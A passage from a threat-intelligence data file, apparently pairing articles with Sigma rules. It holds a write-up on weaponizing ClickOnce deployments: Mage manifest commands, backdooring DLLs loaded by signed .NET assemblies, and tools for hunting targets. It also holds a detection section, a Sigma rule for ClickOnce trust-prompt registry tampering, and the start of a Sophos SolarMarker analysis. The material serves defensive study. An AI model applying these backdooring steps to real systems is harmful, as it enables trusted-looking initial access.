identity attributes. The code includes comments about tokens and attributes related to identity, along with a view of local variables that highlight the values of 'this', 'refId', and 'exact', providing context to the matching process for application identities in the ClickOnce deployment environment.\nTranscription: |\n  public bool Matches(ReferenceIdentity refId, bool exact)\n  {\n      return IsolationInterop.IdentityAuthority.DoesDefinitionMatchReference(exact ? 1U : 0U, this._idComPtr, refId.ComPointer) && this.Version == refId.Version;\n  }\n  \n  // Token: 0x17000158 RID: 344\n  // (get) Token: 0x60000418 RID: 1048 RVA: 0x0000AC14 File Offset: 0x0000AC14\n  public IDENTITY_ATTRIBUTE[] Attributes\n  {\n      get\n      {\n          IEnumIDENTITY_ATTRIBUTE enumIDENTITY_ATTRIBUTE = null;\n          IDENTITY_ATTRIBUTE[] result;\n      }\n  }\n  \n  Locals\n  this: {MyApplication.app, Version=1.0.0.0, Culture=neutral}\n  refId: {MyApplication.app, Version=1.0.0.0, Culture=neutral, processorArchitecture=amd64}\n  exact: true\n```\n\nFortunately there are a lot of assemblies that exist which do not have an identity in the application’s manifest. In the next section we will show how to identify these assemblies, but in the meantime, the figure below shows what an embedded manifest looks like when the default identity is not set, and a non-default manifest was used during the build process instead.\n\n```\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<asmv1:assembly manifestVersion=\"1.0\" xmlns=\"urn:schemas-microsoft-com:asm.v1\" xmlns:asmv1=\"urn:schemas-microsoft-com:asm.v1\" xmlns:asmv2=\"urn:schemas-microsoft-com:asm.v2\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">\n  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">\n    <security>\n      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">\n        <!-- UAC Manifest Options\n            If you want to change the Windows User Account Control level replace the\n            requestedExecutionLevel node with one of the following.\n\n            <requestedExecutionLevel  level=\"asInvoker\" uiAccess=\"false\" />\n            <requestedExecutionLevel  level=\"requireAdministrator\" uiAccess=\"false\" />\n            <requestedExecutionLevel  level=\"highestAvailable\" uiAccess=\"false\" />\n\n            Specifying requestedExecutionLevel node will disable file and registry virtualization.\n            If you want to utilize File and Registry Virtualization for backward\n            compatibility then delete the requestedExecutionLevel node.\n        -->\n        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\" />\n      </requestedPrivileges>\n    </security>\n  </trustInfo>\n\n  <compatibility xmlns=\"urn:schemas-microsoft-com:compatibility.v1\">\n    <application>\n      <!-- A list of all Windows versions that this application is designed to work with.\n      Windows will automatically select the most compatible environment.-->\n\n      <!-- If your application is designed to work with Windows 7, uncomment the following supportedOS node-->\n      <supportedOS Id=\"{35138b9a-5d96-4fbd-8e2d-a2440225f93a}\"/>\n\n      <!-- If your application is designed to work with Windows 8, uncomment the following supportedOS node-->\n      <supportedOS Id=\"{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}\"/>\n\n      <!-- If your application is designed to work with Windows 8.1, uncomment the following supportedOS node-->\n      <supportedOS Id=\"{1f676c76-80e1-4239-95bb-83d0f6d0da78}\"/>\n\n      <!-- This Id value indicates the application supports Windows Threshold functionality-->\n      <supportedOS Id=\"{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}\"/>\n    </application>\n  </compatibility>\n</asmv1:assembly>\n```\n\nThe second condition that is required is for the UAC settings to not be requiredAdministrator or highestAvailable. Another check by the System.Deployment DLL is it will look for the UAC settings and return errors if the disallowed values are set.\n\n```image\nAlt: UAC Check in System.Deployment DLL\nDescription: The image displays a portion of C# code related to verifying requested privileges for a ClickOnce deployment. It includes methods for checking the User Account Control (UAC) settings and registry values associated with the application's execution level. Key components of the code involve logging, accessing the registry, and throwing exceptions based on the execution level conditions.\nTranscription: |\n  private static void VerifyRequestedPrivilegesSupport(string requestedExecutionLevel)\n  {\n      Logger.AddMethodCall(\"VerifyRequestedPrivilegesSupport(\" + requestedExecutionLevel + \") called.\");\n      if (PlatformSpecific.OnVistaOrAbove)\n      {\n          bool flag = false;\n          RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System\");\n          if (registryKey != null && registryKey.GetValue(\"EnableLUA\") == null)\n          {\n              Logger.AddInternalState(\"LUA policy key = \" + registryKey.Name);\n              int num = (int)registryKey.GetValue(\"EnableLUA\");\n              if (num == 0)\n                  flag = true;\n              Logger.AddInternalState(\"LUA is enabled.\");\n          }\n          if (flag && (string.Compare(requestedExecutionLevel, \"requireAdministrator\", StringComparison.OrdinalIgnoreCase) == 0 || string.Compare(requestedExecutionLevel, \"highestAvailable\", StringComparison.OrdinalIgnoreCase) == 0))\n          {\n              throw new InvalidDeploymentException(ExceptionTypes.UnsupportedElevationRequest, string.Format(CultureInfo.CurrentUICulture, Resources.GetString(\"Ex_ManifestExecutionLevelNotSupported\"), new object[0]));\n          }\n      }\n  }\n```\n\nIf UAC information exists, or it is set to ‘asInvoker’ the assembly will work as a ClickOnce deployment.\n\n```image\nAlt: Assembly with No UAC Information\nDescription: The image depicts a user interface of a manifest editor or viewer, showing the XML structure of a ClickOnce application manifest. It highlights the assembly identity, specifying details such as the name, version, processor architecture, and public key token of a dependent assembly. The layout includes a tree view on the left with sections for version information and the manifest, while the main area displays the XML code, indicating the technical details necessary for .NET application deployment.\nTranscription: |\n  <?xml version=\"1.0\" encoding=\"utf-8\"?>\n  <assembly manifestVersion=\"1.0\" xmlns=\"urn:schemas-microsoft-com:asm.v1\">\n    <!-- Enable themes for Windows common controls and dialogs (Windows XP and later) -->\n    <dependency>\n      <dependentAssembly>\n        <assemblyIdentity\n          type=\"win32\"\n          name=\"Microsoft.Windows.Common-Controls\"\n          version=\"6.0.0.0\"\n          processorArchitecture=\"*\"\n          publicKeyToken=\"********\"\n          language=\"*\"\n        />\n      </dependentAssembly>\n    </dependency>\n  </assembly>\n```\n\nSince we are creating ClickOnce applications from scratch, we will have to create new manifests as opposed to our previous weaponization of modifying existing ClickOnce manifests. Microsoft has a utility that is used for this specific task which is called the Manifest Generation and Editing Tool (Mage). Microsoft makes two different tools that can be used, MageUI and Mage. Mage is a command line tool that comes part of the Windows SDK and for the purpose of this blog will be the one we cover.\n\nOnce you have gone through the process of identifying a .NET assembly that can be wrapped up as a ClickOnce deployment, you will want to create the directory structure of the assembly, dependencies, and extra files. As previously mentioned, there are two manifests that will need to be created with Mage — the deployment manifest and the application manifest. The application manifest can be created with the following command:\n\n```\n\"C:\\Program Files (x86)\\Microsoft SDKs\\Windows\\v10.0A\\bin\\NETFX 4.8 Tools\\mage.exe\" -New Application -Processor amd64 -ToFile AppVStreamingUX.exe.manifest -name \"TargetApp\" -Version 1.0.0.0 -FromDirectory .\n```\n\nNext you will need to create the deployment manifest. This can be done with the following command:\n\n```\n\"C:\\Program Files (x86)\\Microsoft SDKs\\Windows\\v10.0A\\bin\\NETFX 4.8 Tools\\mage.exe\" -New Deployment -Processor amd64 -Install false -ProviderUrl \"http://localhost/dist/TargetApp.application\" -AppManifest TargetApp.exe.manifest -ToFile TargetApp.application\n```\n\nThe *ProviderUrl* argument is the location where the deployment manifest will be hosted since the primary method we’re covering is web-based applications. Once the manifests are created, you will see there are some signature values that are created with *Mage*. Just like what was covered when editing existing manifests, these values are not always required and can be removed. If any changes are made to the overall deployment, the signatures will be invalidated and will have to be regenerated which can lead to unnecessary troubleshooting. As mentioned previously, these values are:\n\n- **\\<publicKeyToken\\>**, required but can be nulled with 16 zeros\n- **\\<hash\\>** block can be removed altogether and not required\n- **Publisher identity** block can be removed altogether\n\nNow that we have identified an existing signed .NET assembly that can be deployed as a ClickOnce application, we can go through the same backdoor steps as the other technique. We will follow the code paths, identify called DLLs, and place our code inside of those DLLs. Finally, we can create the manifests with Mage and are ready for deployment.\n\n<iframe allowfullscreen=\"\" class=\"em n fe dz bh\" frameborder=\"0\" height=\"480\" scrolling=\"no\" src=\"https://cdn.embedly.com/widgets/media.html?src=https%3A%2F%2Fwww.youtube.com%2Fembed%2FCpuXgqvnNow%3Ffeature%3Doembed&amp;display_name=YouTube&amp;url=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3DCpuXgqvnNow&amp;image=https%3A%2F%2Fi.ytimg.com%2Fvi%2FCpuXgqvnNow%2Fhqdefault.jpg&amp;key=a19fcc184b9711e1b4764040d3dc5c07&amp;type=text%2Fhtml&amp;schema=youtube\" title=\"Defcon30 ClickOnce - DEMO3\" width=\"854\"></iframe>\n\n---\n\n## Identification of .NET Assemblies and ClickOnce Applications\n\nSo far, we’ve covered the types of applications that can be weaponized, and now we want to discover potential targets. We have released two tools that will aid in the discovery of existing ClickOnce applications and .NET assemblies that can be weaponized for ClickOnce.\n\n> ClickonceHunter\n\n- searches online for existing ClickOnce published code\n- Google dorks, Github and others\n\n> AssemblyHunter\n\n- Searches file paths or files and looks for given criteria (signed, identity info, arch, UAC, etc.)\n- Helps identify target applications to weaponize\n\nClickonceHunter will automate what can be done manually with Google or other related searches.\n\n```image\nAlt: Dorking to Discover Third-Party ClickOnce Deployments\nDescription: The image displays a Bing search results page featuring a query for 'ClickOnce and .NET Framework Resources' with a specified file type of .h. The results include several links to different applications and resources related to ClickOnce, such as 'SPC Connect Pro', 'e-Form RS', 'Geriatric Notes Tool - DeerOaks', and 'MicroMaidCloud'. Each result contains a brief description of the resource, indicating the context and functionality of the applications listed.\nTranscription: |\n  inbody:\"ClickOnce and .NET Framework Resources\" AND filetype:html\n  \n  11-24 Of 11,100 Results\n  \n  1. SPC Connect Pro\n     https://www.spconnectpro.com/install\n     Microsoft .NET Framework 4.6.2 (x86 and x64) SPC Connect Pro License Agreement. If these components are already installed, you can launch the application now. Otherwise, click the button…\n  \n  2. e-Form RS\n     https://eformrs.com/eform\n     If the install doesn't start when you click the button, click on the \"Setup.exe\" program in the Downloads list and select Run. ClickOnce and .Net Framework Resources.\n  \n  3. Geriatric Notes Tool - DeerOaks\n     https://gntweb.deeroaks.com/GNT\n     Cragg Consulting Customer Support :: ClickOnce and .NET Framework Resources …\n  \n  4. MicroMaidCloud\n     https://mmcds.micromaidcloud.com/MicroMaidCloud.html\n     The following prerequisites are required: Microsoft .NET Framework 4.5.2 (x86 and x64) If these components are already installed, you can launch the application now…\n```\n\n```image\nAlt: Github Searches for ClickOnce Projects (maybe with signed releases?)\nDescription: The image displays a screenshot of a GitHub search result for the term 'clickonce:manifest.' It shows a total of 60,209 code results, with relevant statistics such as the number of repositories, code files, commits, and issues. The top match is highlighted, showing XML code for a ClickOnce application manifest file, indicating details about the assembly and identity of the application. The interface is dark-themed, typical of GitHub's design, and provides a structured view of search results and metadata.\nTranscription: |\n  60,209 code results\n  \n  Repositories      236\n  Code              60K\n  Commits           5K\n  Issues            4K\n  Discussions       30\n  Packages          2\n  Marketplace       0\n  Topics            5\n  Wikis             197\n  Users             9\n  \n  JosephGaynier/AzureClickOnce\n  Application Files/ClickOnce_1_0_0_4/ClickOnce.dll.manifest\n  <assembly:assembly xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" \n      xmlns:adaptive=\"http://schemas.microsoft.com/windows/2007/08/xaml\" \n      manifestVersion=\"1.0\" xmlns=\"urn:schemas-microsoft-com:asm.v1\" \n      xmlns:urn=\"urn:schemas-microsoft-com:asm.v2\" \n      xmlns:asmv2=\"urn:schemas-microsoft-com:asm.v2\" \n      xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" \n      xmlns:co=\"urn:schemas-microsoft-com:ClickOnce.v1\" \n      xmlns:asm3=\"urn:schemas-microsoft-com:asm.v3\" \n      xmlns:disg=\"http://www.w3.org/2008/09/xmlsig#\" \n      xmlns:co.v2=\"urn:schemas-microsoft-com:clickonce.v2\">\n      <assemblyIdentity name=\"Click Once.exe\" version=\"1.0.0.5\" \n          publicKeyToken=\"00000000000000000000\" language=\"neutral\" \n          processorArchitecture=\"x86\" type=\"win32\"/>\n  </assembly>\n  \n  JosephGaynier/AzureClickOnce\n  Application Files/ClickOnce_1_0_0_2/ClickOnce.dll.manifest\n```\n\nWhile ClickonceHunter will go look through the internet for existing applications, AssemblyHunter will recursively search local file systems for assemblies that meet the criteria for a regular .NET assembly to be deployed as a ClickOnce application.\n\n```image\nAlt: Usage for AssemblyHunter\nDescription: The image depicts a command line interface output for the tool 'AssemblyHunter.exe'. It lists various run type options and their corresponding examples, showing users how to utilize the tool to search for .NET assemblies and related information. Key options include searching paths, files, services, and autoruns, along with optional arguments that allow for more specific queries regarding assembly characteristics and configurations.\nTranscription: |\n  PS C:\\> .\\AssemblyHunter.exe help\n  \n  AssemblyHunter.exe\n  \n  Run Type Options:\n    path        (ex: path=C:\\Users)              full path to search\n    file        (ex: file=C:\\file.exe)           check if a specific file is an assembly\n    collection  (ex: file=C:\\files.txt)          run checks against assemblies listed in a file\n    services    (ex: services=services)          enumerates all services for assemblies\n    tasks       (ex: tasks=tasks)                enumerates all scheduled tasks for assemblies\n    autoruns    (ex: autoruns=autoruns)          enumerates common autorun locations for assemblies\n  \n  Optional args:\n    recurse      (ex: recurse=true)              recurse the path given\n    allPaths     (ex: allPaths=true)             recurses all directories, by default some directories with common Microsoft assemblies are skipped\n    exeonly      (ex: exeonly=true)              look for exes only\n    getarch      (ex: getarch=true)              get assembly architecture\n    servicename  (ex: servicename=true)          check if an exe is a service executable\n    isservice    (ex: isservice=true)            check a specific service (needs services run)\n    getuac      (ex: getuac=true)                gets UAC settings of assembly\n    getrefs      (ex: getrefs=true)              gets references for target assembly\n    getsid       (ex: getsid=true)               gets internal assembly manifest identity\n    getsmid      (ex: getsmid=true)              gets internal application manifest identity\n    getappmanifest (ex: getappmanifest=true)     gets internal application manifest\n    getasmmanifest (ex: getasmmanifest=true)     gets internal assembly manifest\n  \n  * path, file, collection, services, tasks, or autoruns should indicate the type of search performed, all other options narrow down the search\n```\n\n```image\nAlt: AssemblyHunter Discovering .NET Assembly\nDescription: The image displays a command line output from a tool called AssemblyHunter, which is used to identify .NET assemblies in a specific directory. The output lists several found assemblies along with their details, including the assembly manifest identity, version, culture, public key token, and UAC (User Account Control) settings. The highlighted portion indicates that some assemblies lack an application manifest identity, which is crucial for ClickOnce deployment. This content provides valuable technical information relevant to the identification and potential weaponization of .NET applications.\nTranscription: |\n  PS C:\\> .\\AssemblyHunter.exe\n  path=C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319 exonly=true getsid=true getapid=true getauc=true signed=true\n  [+] Found assembly: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\AddInProcess.exe\n      [+] Cert Issuer Name: CN=Microsoft Code Signing PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US\n      [+] Cert Subject Name: CN=Microsoft Corporation, O=Microsoft Corporation, L=Redmond, S=Washington, C=US\n      [+] UAC setting: asInvoker\n      [+] Assembly Manifest Identity: AddInProcess, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089, processorArchitecture=MSIL\n      [-] No Application Manifest Identity\n  \n  [+] Found assembly: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\AddInProcess32.exe\n      [+] Cert Issuer Name: CN=Microsoft Code Signing PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US\n      [+] Cert Subject Name: CN=Microsoft Corporation, O=Microsoft Corporation, L=Redmond, S=Washington, C=US\n      [+] UAC setting: asInvoker\n      [+] Assembly Manifest Identity: AddInProcess32, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089, processorArchitecture=x86\n      [-] No Application Manifest Identity\n  \n  [+] Found assembly: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\AddInUtil.exe\n      [+] Cert Issuer Name: CN=Microsoft Code Signing PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US\n      [+] Cert Subject Name: CN=Microsoft Corporation, O=Microsoft Corporation, L=Redmond, S=Washington, C=US\n      [+] UAC setting: asInvoker\n      [+] Assembly Manifest Identity: AddInUtil, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089, processorArchitecture=MSIL\n      [-] No Application Manifest Identity\n  \n  [+] Found assembly: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\aspnet_compiler.exe\n      [+] Cert Issuer Name: CN=Microsoft Code Signing PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US\n      [+] Cert Subject Name: CN=Microsoft Corporation, O=Microsoft Corporation, L=Redmond, S=Washington, C=US\n      [+] UAC setting: asInvoker\n      [+] Assembly Manifest Identity: aspnet_compiler, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f711d50a3a, processorArchitecture=AMD64\n      [-] No Application Manifest Identity\n```\n\nUsing AssemblyHunter, we can quickly identify assemblies across a host’s filesystem and look for values that will be useful to us.\n\n```image\nAlt: AssemblyHunter Showing Assemblies that can be Weaponized\nDescription: The image displays a terminal output from running the AssemblyHunter tool, which is used to discover .NET assemblies. The output shows several found assemblies along with their details including paths, certificate issuer names, UAC settings, and assembly manifest identities. Notably, it highlights instances where there is no application manifest identity. This output provides technical information relevant to the identification and potential weaponization of ClickOnce applications.\nTranscription: |\n  PS C:\\> .\\AssemblyHunter.exe\n  path=C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319 exenoly=true getsid=true getapid=true getuac=true signed=true\n  [+] Found assembly: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\AddInProcess.exe\n      [+] Cert Issuer Name: CN=Microsoft Code Signing PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US\n      [+] Cert Subject Name: CN=Microsoft Corporation, O=Microsoft Corporation, L=Redmond, S=Washington, C=US\n      [+] UAC setting: asInvoker\n      [+] Assembly Manifest Identity: AddInProcess, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089, processorArchitecture=MSIL\n      [-] No Application Manifest Identity\n  \n  [+] Found assembly: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\AddInProcess32.exe\n      [+] Cert Issuer Name: CN=Microsoft Code Signing PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US\n      [+] Cert Subject Name: CN=Microsoft Corporation, O=Microsoft Corporation, L=Redmond, S=Washington, C=US\n      [+] UAC setting: asInvoker\n      [+] Assembly Manifest Identity: AddInProcess32, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089, processorArchitecture=x86\n      [-] No Application Manifest Identity\n  \n  [+] Found assembly: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\AddInUtil.exe\n      [+] Cert Issuer Name: CN=Microsoft Code Signing PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US\n      [+] Cert Subject Name: CN=Microsoft Corporation, O=Microsoft Corporation, L=Redmond, S=Washington, C=US\n      [+] UAC setting: asInvoker\n      [+] Assembly Manifest Identity: AddInUtil, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089, processorArchitecture=MSIL\n      [-] No Application Manifest Identity\n  \n  [+] Found assembly: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\aspnet_compiler.exe\n      [+] Cert Issuer Name: CN=Microsoft Code Signing PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US\n      [+] Cert Subject Name: CN=Microsoft Corporation, O=Microsoft Corporation, L=Redmond, S=Washington, C=US\n      [+] UAC setting: asInvoker\n      [+] Assembly Manifest Identity: aspnet_compiler, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f711d50a3a, processorArchitecture=AMD64\n      [-] No Application Manifest Identity\n```\n\nAssemblyHunter will also show us assemblies that are not useful to us if we would like to see them.\n\n```image\nAlt: Example of anAssembly that Cannot be Weaponized\nDescription: The image displays a terminal or command prompt output that provides detailed information about a found .NET assembly located at 'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CasPol.exe'. It includes various attributes such as the certificate issuer name, subject name, UAC setting, assembly manifest identity, and application manifest identity. Key details highlighted in red help identify the assembly's attributes relevant for potential weaponization.\nTranscription: |\n  [+] Found assembly: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CasPol.exe\n  [+] Cert Issuer Name: CN=Microsoft Code Signing PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US\n  [+] Cert Subject Name: CN=Microsoft Corporation, O=Microsoft Corporation, L=Redmond, S=Washington, C=US\n  [+] UAC setting: asInvoker\n  [+] Assembly Manifest Identity: caspol, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=AMD64\n  [+] Application Manifest Identity: 1.0.0.0, MyApplication.app\n```\n\n---\n\n## Detection and Prevention Opportunities\n\nA major benefit to defenders who want to identify malicious ClickOnce deployments is that ClickOnce is not commonly used in many corporate environments. Defenders can baseline their environments to look for how prevalent they are and make detection or prevention decisions. Things we would consider looking for when identifying or preventing malicious ClickOnce use is:\n\n> **Monitoring dfsvc.exe process activity**\n\n- Monitoring child process activity (e.g. child processes with unsigned module loads)\n- Baseline required ClickOnce activity to whitelist applications with valid business use-cases\n- Monitoring activity associated with *dfshim.dll* (can also be used for launching ClickOnce deployments)\n\n> Evaluate ETW telemetry associated with ClickOnce deployment execution\n\n- Keep in mind ETW bypasses or *\\<etwEnable\\>* .NET config value\n\n> Baseline the default ClickOnce installation directories\n\n- *%LOCALAPPDATA%\\Apps\\2.0\\<string>*\n\n> Baseline of application that have never been seen making connections to the internet\n\n> Disable all ClickOnce installations from the internet, while still allowing from other trust zones\n\n- Options include: Enabled, AuthenticodeRequired, and Disabled\n- Zones include: MyComputer, LocalIntranet, TrustedSites, Internet, UntrustedSites\n- To disable installation from internet: *\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\.NETFramework\\Security\\TrustManager\\PromptingLevel — Internet:Disabled*\n\n> If an Application Control solution is deployed\n\n- Prevent unreputable DLLs from being loaded\n\nIf ClickOnce application execution from the internet is disabled using the registry key(s) mentioned above, a user will receive a prompt that does not give them the option to run the application.\n\n```image\nAlt: Prevention of ClickOnce Installation from Internet Trust Zone\nDescription: The image is a screenshot of a security warning dialog box on a computer. It indicates that an application installation has been blocked by the administrator due to potential security risks. The dialog provides the following details: the application name is 'Defcon30 Demo, Inc.', the source URL is 'defcon30.azureedge.net', and the publisher is listed as 'Unknown Publisher'. Additionally, there is a note stating that security settings on the computer prevent the application from being installed.\nTranscription: |\n  Application Install - Security Warning\n  \n  Your administrator has blocked this application because it potentially poses a security risk to your computer.\n  \n  Name:\n  Defcon30 Demo, Inc.\n  \n  From (Hover over the string below to see the full domain):\n  defcon30.azureedge.net\n  \n  Publisher:\n  Unknown Publisher\n  \n  [Close]\n  \n  Your security settings do not allow this application to be installed on your computer.\n```\n\n---\n\n## Closing\n\nBased on all that was covered, we see ClickOnce as one of the best opportunities for initial access. There are still plenty of areas to dig into and additional potential for offensive use-cases.",
    "sigma_rule": {
      "title": "ClickOnce Trust Prompt Tampering",
      "id": "ac9159cc-c364-4304-8f0a-d63fc1a0aabb",
      "status": "test",
      "description": "Detects changes to the ClickOnce trust prompt registry key in order to enable an installation from different locations such as the Internet.",
      "references": [
        "https://posts.specterops.io/less-smartscreen-more-caffeine-ab-using-clickonce-for-trusted-code-execution-1446ea8051c5",
        "https://learn.microsoft.com/en-us/visualstudio/deployment/how-to-configure-the-clickonce-trust-prompt-behavior"
      ],
      "author": "@SerkinValery, Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-06-12",
      "modified": "2023-08-17",
      "tags": [
        "attack.defense-evasion",
        "attack.t1112"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|contains": "\\SOFTWARE\\MICROSOFT\\.NETFramework\\Security\\TrustManager\\PromptingLevel\\",
          "TargetObject|endswith": [
            "\\Internet",
            "\\LocalIntranet",
            "\\MyComputer",
            "\\TrustedSites",
            "\\UntrustedSites"
          ],
          "Details": "Enabled"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate internal requirements."
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_clickonce_trust_prompt.yml",
    "id": "936"
  },
  {
    "url": "https://news.sophos.com/en-us/2022/02/01/solarmarker-campaign-used-novel-registry-changes-to-establish-persistence/?cmp=30728",
    "markdown": "# SolarMarker campaign used novel registry changes to establish persistence\n\nInserting custom file handling rules for a randomly-created file extension and a .LNK in Windows' startup folder, malware installer created a stealthy persistence mechanism for backdoor.\n\n**Posted on** February 01, 2022\n\n### Categories\n- Threat Research\n- featured\n- Information Stealers\n- Jupiter\n- Polazert\n- Security Operations\n- SEO Poisoning\n- SolarMarker\n\nOver the past seven months, SophosLabs has monitored a series of new efforts to distribute SolarMarker, an information stealer and backdoor (also known as Jupyter or Polazert). First detected in 2020, the .NET malware usually delivered by a PowerShell installer has information harvesting and backdoor capabilities.\n\nIn October, 2021, we observed a set of active SolarMarker campaigns that combined search engine optimization (SEO) targeting with custom-made MSI installer packages to deliver the payload. These installers used an unusual method to ensure the persistence of the SolarMarker backdoor.\n\nThe campaigns followed a common pattern: Using malicious SEO techniques, the SolarMarker actors were able to place links to web sites with deceptive content in search results from multiple search engines. While this sort of SEO poisoning has been seen in the past, it has rarely been seen used beyond some recent downloader-as-a-service operations.\n\nThese SEO efforts, which leveraged a combination of Google Groups discussions and deceptive web pages and PDF documents hosted on compromised (usually WordPress) websites, were so effective that the SolarMarker lures were usually at or near the top of search results for phrases the SolarMarker actors targeted.\n\nThese lure sites, in turn, attempted to deceive users into downloading a Windows installer. When downloaded, the malicious Microsoft installer (.msi) files would in turn execute a decoy install program, while at the same time launching a PowerShell script that installed the malware.\n\nThe PowerShell script modified the Windows registry and dropped a .lnk file into Windows’ startup directory to establish persistence. Using Windows registry changes made by the install script, the loading of the .lnk at Windows startup would load the malware from an encrypted payload hidden amongst a “smokescreen” of other, seemingly meaningless files.\n\n### SEO blunderbuss\n\nThe criminals used at least three distribution methods for the malware distribution, sometimes simultaneously. For example, in the following example all three of the distribution methods ended up in the top ten Google hits for the poisoned keywords (marked by method in the screenshot):\n\n```image\nAlt: SolarMarker Search\nDescription: The image shows a screenshot of a Google search results page for the keywords 'Variable Length File Declaration in Cobol.' There are multiple search results displayed, with three different methods of malware distribution labeled as Method 1, Method 2, and Method 3. Each method corresponds to different search results that appear in the top rankings, indicating how the attackers utilized SEO tactics for their distribution strategy.\nTranscription: |\n  Variable Length File Declaration In Cobol\n  1. https://lightcameras.org/uploads/formatfile.v... | 12 pages\n  2. https://lkkc.us/variable-length-file-declaration-in-cobol\n  3. https://www.microfocus.com/ | HLFHDFIL104\n  4. https://iboolits.blogspot.com/file-handling-working...\n  5. https://groups.google.com | MII_GSInfoSet\n  \n  Method 1\n  Method 2\n  Method 3\n```\n\nIn each of these SEO methods, the name of the MSI installer file matches the search terms. For example, one of the samples we recovered was named **good-choice-bad-choice-worksheet-for-kids.msi**. Based on the names of samples we’ve seen in the wild, the following search keywords appeared to be the most successful from the attacker’s point of view:\n\n```image\nAlt: SolarMarker Word Cloud\nDescription: The image is a word cloud displaying various keywords associated with the SolarMarker campaign's malware distribution methods. The words are arranged in varying sizes, with larger words indicating higher relevance or frequency. Terms like 'worksheet', 'form', 'letter', and 'reference' stand out prominently, suggesting these keywords were successful in the attackers' SEO tactics to lure victims into downloading malicious files.\nTranscription: |\n  amazon         answer         bank            bullying        canada\n  center         checklist      cross           cube            data\n  declaration    excel          file            filter          form\n  free           guide          handbook        hubbell         instructions\n  letter         magnetic       notice          pdf             penalty\n  practice       preceptor      presentation    questionnaire   reference\n  request        sample         school          service         spreadsheet\n  statement      study          sunwing         tax             tools\n  volunteer      vs             waiver          template        worksheets\n  \n                               SOPHOSlabs\n```\n\n### SEO Method 1: Google Groups\n\nIn the first method we observed, the SEO was accomplished through the creation of Google Groups discussions. The attackers created multiple fake Google groups, each with 500-600 fake conversation entries, targeting the most common search terms in a wide variety of subjects:\n\n```image\nAlt: Google Groups SolarMarker\nDescription: The image is a screenshot of a Google Groups discussion page, displaying multiple conversation entries. Each entry includes a title and a brief description, likely related to potential phishing or SEO manipulation tactics employed by the SolarMarker campaign. The titles appear to reference various topics, suggesting a broad targeting strategy, while the layout indicates that these entries are designed to mislead users into clicking on links that may lead to malicious content.\nTranscription: |\n  | Conversations                                                                                                                              |\n  | ------------------------------------------------------------------------------------------------------------------------------------------ |\n  | earth.zalon                                                                                                                                |\n  | Catch Non-Standard Risk! - [StopByDgDg] The trend networks and financial developments used always options: How the...                      |\n  | Assessing Vio Insurance - [PRAInsurance] You have seen the insurance descriptions in emails for sales tactics.                             |\n  | Example of Mailsoft Content and Latest Content - [Mailsoft] Fixed trends still exist, the reasons for example of defining a...             |\n  | Ear Modeling Practices of Amount Worksheet - [EarModeling] Just to articulate the importance of modeling to solve an equation more...      |\n  | Charge Margins in Unlicensed Spreadsheet - [ChargeMargins] As you have seen, the trend needed to be shown to the...                        |\n  | World War Timeline Worksheet - [WWTimeline] With existing systems to sort out knowledge, just remember to use crucial keep...              |\n  | Job Knowledge Evaluation Phrase - [JobKnowledge] The skills needed to be available could through enhancing being related with...           |\n  | Debt Credit Card New Request - [DebtCredit] Just to ensure that the request was completed, please request entry for exchange...            |\n  | Major Ideas for the Constitution - [MajorIdeas] The ideas are secrets, including ideas needed for directors of persons and benefits...     |\n  | Ed U Life Insurance Policy Structure Value Calculator - [EdULife] There has been confusion surrounding a pool, however, Medicare claims... |\n  | Kentucky Secretary of State Master Public Search - [KentuckySearch] Just to ensure it is a direct query, as you have seen, it is...        |\n  | Denied Close Declaration - [DeniedClose] If it was immediately denied, please acquire 